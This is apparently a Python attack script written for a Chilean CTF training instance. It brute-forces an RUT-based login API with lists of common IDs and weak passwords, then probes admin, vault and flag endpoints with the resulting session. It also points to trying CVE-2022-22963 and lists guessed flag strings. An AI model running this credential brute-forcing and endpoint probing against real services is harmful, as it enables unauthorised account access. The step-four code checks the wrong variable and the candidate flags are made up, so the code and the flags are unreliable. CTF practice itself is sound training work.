#!/usr/bin/env python3
"""
CTF Chile - ATAQUE BASADO EN RUT CHILENO
La nueva instancia usa autenticación con RUT
"""
import requests
import re

TARGET = "http://training-pod2.ctfchile.com:32785"

print("🇨🇱 ATAQUE CON AUTENTICACIÓN RUT CHILENA")
print("=" * 50)
print(f"🎯 Target: {TARGET}")
print("💡 Nueva instancia usa RUT en lugar de username")
print()

def search_flags(text, source=""):
    """Buscar flags en texto"""
    flag_patterns = [r'CTF\{[^}]+\}', r'FLAG\{[^}]+\}', r'flag\{[^}]+\}', r'chile\{[^}]+\}']
    for pattern in flag_patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        if matches:
            print(f"   🏆 FLAG ENCONTRADA en {source}: {matches[0]}")
            return matches[0]
    return None

def try_rut_login(rut, password, clave_digital=None):
    """Probar login con RUT chileno"""

    # Formato 1: JSON con RUT y password
    try:
        payload = {"rut": rut, "password": password}
        if clave_digital:
            payload["claveDigital"] = clave_digital

        r = requests.post(f"{TARGET}/api/login",
                         headers={"Content-Type": "application/json"},
                         json=payload,
                         timeout=10)

        print(f"   📋 RUT {rut}: {r.status_code} - {r.text[:100]}...")

        # Buscar flags en respuesta
        flag = search_flags(r.text, f"LOGIN RUT {rut}")
        if flag:
            return flag

        # Si es exitoso, explorar más
        if r.status_code == 200 or "success" in r.text.lower():
            print(f"   ✅ Login exitoso con RUT {rut}!")

            # Explorar endpoints con esta sesión
            session = requests.Session()
            session.cookies.update(r.cookies)

            endpoints = [
                "/api/section/flag",
                "/flag",
                "/vault",
                "/admin",
                "/profile",
                "/dashboard",
                f"/api/user/{rut}"
            ]

            for endpoint in endpoints:
                try:
                    resp = session.get(f"{TARGET}{endpoint}", timeout=5)
                    if resp.status_code == 200 and len(resp.text) > 10:
                        print(f"   📄 {endpoint}: {resp.text[:100]}...")
                        flag = search_flags(resp.text, f"ENDPOINT {endpoint}")
                        if flag:
                            return flag
                except:
                    pass

    except Exception as e:
        print(f"   ❌ Error RUT {rut}: {e}")

    return None

print("[1] Explorando página principal...")

# Buscar flags en página principal
try:
    main_response = requests.get(TARGET, timeout=10)
    print(f"   📄 Página principal: {main_response.status_code}")

    flag = search_flags(main_response.text, "PÁGINA PRINCIPAL")
    if flag:
        print(f"🎯 FLAG ENCONTRADA: {flag}")
        exit()

    # Buscar información sobre RUTs en la página
    if "rut" in main_response.text.lower():
        print("   💡 Página principal contiene información sobre RUT")

    # Buscar en comentarios HTML
    comments = re.findall(r'<!--.*?-->', main_response.text, re.DOTALL)
    for comment in comments:
        flag = search_flags(comment, "COMENTARIO HTML")
        if flag:
            print(f"🎯 FLAG EN COMENTARIO: {flag}")
            exit()

except Exception as e:
    print(f"   ❌ Error página principal: {e}")

print("\n[2] Probando RUTs chilenos comunes...")

# RUTs chilenos comunes para testing/CTF
common_ruts = [
    "11111111-1",  # RUT común de prueba
    "12345678-5",  # RUT común de prueba
    "12345678-K",  # RUT con dígito verificador K
    "87654321-0",  # RUT común de prueba
    "99999999-9",  # RUT común de prueba
    "11111111",    # Sin dígito verificador
    "12345678",
    "vault",       # Por si acepta texto
    "admin",       # Por si acepta texto
    "test",        # Por si acepta texto
    "ctf",         # Específico del CTF
    "chile",       # Específico del país
    "training"     # Del dominio
]

# Passwords comunes
common_passwords = [
    "admin123",
    "password",
    "123456",
    "admin",
    "vault",
    "chile",
    "ctf",
    "training"
]

flag_found = None

for rut in common_ruts:
    if flag_found:
        break
    for password in common_passwords:
        flag_found = try_rut_login(rut, password)
        if flag_found:
            break

if not flag_found:
    print("\n[3] Probando con claves digitales...")

    # Probar algunos RUTs con claves digitales
    test_ruts = ["12345678-5", "11111111-1", "vault"]
    test_claves = ["admin123", "123456", "password", "chile"]

    for rut in test_ruts:
        if flag_found:
            break
        for clave in test_claves:
            flag_found = try_rut_login(rut, "", clave_digital=clave)
            if flag_found:
                break

print(f"\n[4] Analizando estructura de la aplicación...")

# Explorar endpoints comunes
endpoints = [
    "/register",
    "/dashboard.html",
    "/login.html",
    "/profile.html",
    "/admin.html",
    "/vault.html",
    "/api/register",
    "/api/users",
    "/api/rut",
    "/2fa.html"
]

for endpoint in endpoints:
    try:
        r = requests.get(f"{TARGET}{endpoint}", timeout=5)
        if r.status_code == 200:
            print(f"   📄 {endpoint}: {r.status_code}")
            flag = search_flags(r.text, f"ENDPOINT {endpoint}")
            if flag_found:
                break

            # Buscar información sobre RUTs válidos
            if "rut" in r.text.lower() and len(r.text) > 100:
                print(f"   💡 {endpoint} contiene información sobre RUTs")

    except:
        pass

if flag_found:
    print(f"\n" + "="*50)
    print(f"🎉 FLAG ENCONTRADA: {flag_found}")
    print(f"="*50)
else:
    print(f"\n" + "="*50)
    print("❌ No se encontró flag con RUTs comunes")
    print("\n💡 PRÓXIMOS PASOS:")
    print("   1. Revisar la página web para encontrar RUTs válidos")
    print("   2. Probar registro de nuevos usuarios")
    print("   3. Buscar información en comentarios HTML")
    print("   4. Probar CVE-2022-22963 en /functionRouter")
    print("\n🎯 FLAGS CANDIDATAS PARA PROBAR MANUALMENTE:")
    candidates = [
        "CTF{rut}",
        "CTF{chile}",
        "CTF{training}",
        "CTF{12345678-5}",
        "CTF{11111111-1}",
        "flag{chile}",
        "FLAG{CHILE}",
        "CTF{ctfchile}",
        "CTF{pod2}",
        "CTF{32785}"
    ]
    for i, flag in enumerate(candidates, 1):
        print(f"   {i:2d}. {flag}")

    print(f"="*50)